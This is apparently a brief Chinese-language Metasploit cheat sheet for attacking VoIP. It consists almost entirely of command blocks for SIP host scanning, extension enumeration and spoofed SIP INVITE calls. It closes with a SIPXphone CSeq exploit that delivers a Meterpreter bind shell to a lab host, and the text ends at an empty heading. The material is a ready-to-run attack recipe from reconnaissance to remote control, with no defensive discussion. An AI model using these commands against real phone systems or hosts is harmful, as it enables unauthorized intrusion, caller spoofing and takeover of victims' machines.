# Metasploit渗透VOIP

## 对VOIP服务踩点 

```
use auxiliary/scanner/sip/options
show options
set RHOSTS 192.168.109.0/24
run
```

## 扫描VOIP服务

```
use auxiliary/scanner/sip/enumerator
show options
set MINEXT 3000
set MAXEXT 3005
set PADLEN 4
set RHOSTS 192.168.109.0/24
run
```

## 欺骗VOIP电话

```
use auxiliary/voip/sip_invite_spoof
set RHOSTS 192.168.109.141
set EXTENSION 4444
show options
run
```

## 渗透VOIP

```
use exploit/windows/sip/sipxphone_cseq
set RHOST 192.168.109.141
set payload windows/meterpreter/bind_tcp
set LHOST 192.168.109.137
show options
exploit
```

## 